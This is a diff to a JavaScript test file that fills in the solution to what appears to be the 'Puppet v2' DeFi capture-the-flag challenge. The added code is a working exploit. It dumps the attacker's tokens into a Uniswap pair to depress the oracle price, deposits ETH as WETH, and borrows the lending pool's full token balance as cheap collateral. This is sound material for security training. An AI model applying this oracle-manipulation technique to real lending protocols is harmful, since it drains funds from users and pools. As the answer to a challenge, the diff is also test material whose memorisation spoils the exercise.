@@ -82,6 +82,44 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            ethers.BigNumber.from('1'),
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.be.eq('0');
+
+        var wethBalance = await this.weth.balanceOf(attacker.address);
+
+        expect(wethBalance).to.be.gt('0');
+
+        const depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+
+        expect(
+            await this.weth.connect(attacker).deposit( { value: depositRequired.sub(wethBalance) } )
+        ).to.emit(this.weth, "Deposit")
+        .withArgs(attacker.address, depositRequired.sub(wethBalance))
+
+        expect(depositRequired <= await this.weth.balanceOf(attacker.address)).to.be.true;
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, depositRequired);
+
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE,
+        );
     });
 
     after(async function () {
